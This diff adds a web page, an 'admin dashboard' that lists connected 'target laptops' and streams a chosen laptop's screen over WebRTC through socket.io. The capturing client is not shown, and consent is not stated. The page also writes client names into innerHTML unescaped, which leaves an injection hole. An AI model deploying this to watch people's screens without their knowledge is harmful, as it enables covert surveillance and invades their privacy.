@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Anzee Admin Dashboard</title>
+    <style>
+        body { font-family: sans-serif; background: #222; color: white; margin: 0; padding: 20px; text-align: center; }
+        .clients { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; margin-top: 20px; }
+        .client-card { background: #333; padding: 20px; border-radius: 8px; cursor: pointer; border: 2px solid #444; width: 200px; transition: 0.3s; }
+        .client-card:hover { border-color: #007bff; background: #444; }
+        video { width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #007bff; border-radius: 8px; background: black; }
+        .hidden { display: none !important; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <h1 id="title">Connected Target Laptops</h1>
+    <div id="clientsList" class="clients"></div>
+    <video id="preview" autoplay muted class="hidden"></video>
+    <button id="backBtn" class="hidden" style="margin-top:20px;">Back to PC List</button>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let peerConnection;
+        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+        let activeTarget = null;
+        
+        socket.emit('get-clients');
+
+        socket.on('client-list', (clients) => {
+            const list = document.getElementById('clientsList');
+            list.innerHTML = '';
+            const count = Object.keys(clients).length;
+            if(count === 0) list.innerHTML = "<p style='color:gray'>No laptops connected yet...</p>";
+            
+            Object.values(clients).forEach(client => {
+                const div = document.createElement('div');
+                div.className = 'client-card';
+                div.innerHTML = `<h3>${client.name}</h3><p style="color: #28a745; font-weight: bold;">🟢 Online</p>`;
+                div.onclick = () => watchClient(client.id, client.name);
+                list.appendChild(div);
+            });
+        });
+
+        function watchClient(clientId, clientName) {
+            activeTarget = clientId;
+            document.getElementById('clientsList').classList.add('hidden');
+            document.getElementById('preview').classList.remove('hidden');
+            document.getElementById('backBtn').classList.remove('hidden');
+            document.getElementById('title').innerText = "Viewing: " + clientName;
+            
+            // Request the client to start sending their screen
+            socket.emit('request-offer', clientId);
+        }
+
+        document.getElementById('backBtn').onclick = () => {
+            document.getElementById('clientsList').classList.remove('hidden');
+            document.getElementById('preview').classList.add('hidden');
+            document.getElementById('backBtn').classList.add('hidden');
+            document.getElementById('title').innerText = "Connected Target Laptops";
+            if (peerConnection) peerConnection.close();
+            peerConnection = null;
+            document.getElementById('preview').srcObject = null;
+        };
+
+        socket.on('offer', async (data) => {
+            if (data.from !== activeTarget) return;
+            if (peerConnection) peerConnection.close();
+            
+            peerConnection = new RTCPeerConnection(configuration);
+            
+            peerConnection.onicecandidate = e => {
+                if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: activeTarget });
+            };
+            
+            peerConnection.ontrack = e => {
+                document.getElementById('preview').srcObject = e.streams[0];
+            };
+
+            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+            socket.emit('answer', { answer, targetId: activeTarget });
+        });
+
+        socket.on('ice-candidate', async (data) => {
+            if (peerConnection && data.from === activeTarget) {
+                await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+            }
+        });
+    </script>
+</body>
+</html>
